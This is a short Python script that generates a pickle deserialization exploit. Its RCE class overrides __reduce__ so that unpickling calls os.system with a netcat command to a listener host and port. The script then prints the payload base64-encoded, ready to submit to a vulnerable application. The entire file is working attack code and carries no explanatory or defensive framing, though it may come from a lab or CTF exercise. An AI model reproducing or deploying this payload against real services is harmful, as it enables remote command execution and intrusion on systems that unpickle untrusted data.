import pickle
import base64
import os

LHOST = "localhost"
LPORT = "1234"

class RCE:
    def __reduce__(self):
        cmd = (f'nc {LHOST} {LPORT}')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE(), 2)
    print(base64.urlsafe_b64encode(pickled))